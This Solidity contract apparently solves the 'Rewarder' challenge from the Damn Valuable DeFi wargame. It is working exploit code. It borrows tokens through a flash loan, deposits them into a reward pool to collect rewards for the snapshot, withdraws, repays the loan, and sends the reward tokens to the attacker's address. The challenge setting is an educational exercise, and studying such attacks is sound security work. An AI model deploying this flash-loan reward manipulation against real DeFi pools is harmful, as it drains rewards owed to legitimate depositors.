pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "hardhat/console.sol";

interface RewardPool {
	function deposit(uint256 amountToDeposit) external;
	function withdraw(uint256 amountToWithdraw) external;
	function distributeRewards() external returns (uint256);
}

interface FlashLoanPool {
	function flashLoan(uint256 amount) external;
}

interface BasicRewardToken {
	function transfer(address, uint256) external;
	function balanceOf(address) external returns (uint256);
}

/**
 * The RewarderExploit contract leverages a flash loan to mint reward tokens and send them back to the attacker.
 */
contract RewarderExploit {
	address lp_pool;
	address rw_pool;
	address token;
	address owner;

	constructor(address _owner, address _lp_pool, address _rw_pool, address _token){
		owner = _owner;
		lp_pool = _lp_pool;
		rw_pool = _rw_pool;
		token = _token;
	}

	function exploit(uint256 _amount) external {
		require (msg.sender == owner);
		
		console.log("[CONTRACT] Getting flash loan...");
		FlashLoanPool(lp_pool).flashLoan(_amount);
		console.log("[CONTRACT] Repayed flash loan !");
	}

	function transferRewards(address _rw_token) external {
		require(msg.sender == owner);
		BasicRewardToken(_rw_token).transfer(owner, BasicRewardToken(_rw_token).balanceOf(address(this)));
	}

	function receiveFlashLoan(uint256 _amount) external {
		require(msg.sender == lp_pool);

		console.log("[CONTRACT] Received", DamnValuableToken(token).balanceOf(address(this)), "from", msg.sender);
		DamnValuableToken(token).approve(rw_pool, _amount); // Set allowance of reward contract to enable deposit of liquidity tokens
		
		RewardPool(rw_pool).deposit(_amount); // Get rewards from liquidity tokens (from flash loan)
		console.log("[CONTRACT] Sent", _amount, "to", rw_pool);
		
		RewardPool(rw_pool).withdraw(_amount); // Withdraw liquidity tokens
		console.log("[CONTRACT] Withdrawn", DamnValuableToken(token).balanceOf(address(this)), "from", rw_pool);
		
		DamnValuableToken(token).transfer(lp_pool, _amount);
		console.log("[CONTRACT] Sent", _amount, "to", lp_pool);
	}
}
